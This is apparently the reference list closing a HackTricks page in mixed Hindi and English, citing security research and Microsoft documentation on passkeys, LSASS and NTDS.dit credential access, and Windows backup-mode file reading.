- [4] [Unit 42 – Pass the Passkey: Passwordless Authentication में एक novel attack surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows Hacking: Microsoft Systems और Networks पर Attacks](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store वास्तव में कैसे काम करता है: NTDS.dit के अंदर (भाग 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho ने Still Toolkit के साथ अपना Cyber-Espionage Arsenal विस्तारित किया](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW function और `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – active sessions terminate करना](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
